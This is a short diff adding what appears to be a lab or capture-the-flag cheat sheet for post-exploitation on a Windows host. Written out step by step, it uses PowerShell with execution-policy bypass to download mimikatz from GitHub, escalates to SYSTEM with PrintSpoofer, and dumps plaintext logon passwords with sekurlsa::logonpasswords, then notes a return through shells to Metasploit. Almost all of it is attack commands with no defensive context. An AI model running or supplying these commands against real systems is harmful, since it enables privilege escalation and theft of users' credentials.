@@ -1,0 +1,22 @@
+# mimikatz.exe
+
+# Download mimizip
+powershell -ep bypass -c "wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip -o mimizip.zip"
+
+# Extract ZIP
+expand-archive -Force mimizip.zip
+
+# Exit out of Powershell
+exit
+
+# Windows Priviledge
+HTTP-ADMIN cmd $ printspoofer.exe -i -c cmd.exe
+
+# Launch mimikatz.exe
+C:\users\http-admin\mimizip\x64\mimikatz.exe
+
+# Check privilege
+privilege::debug
+
+# This gives us a large list of plaintext, with this we can exit box 1 (exit mimikatz, then system shell, then user shell, then metasploit)
+sekurlsa::logonpasswords
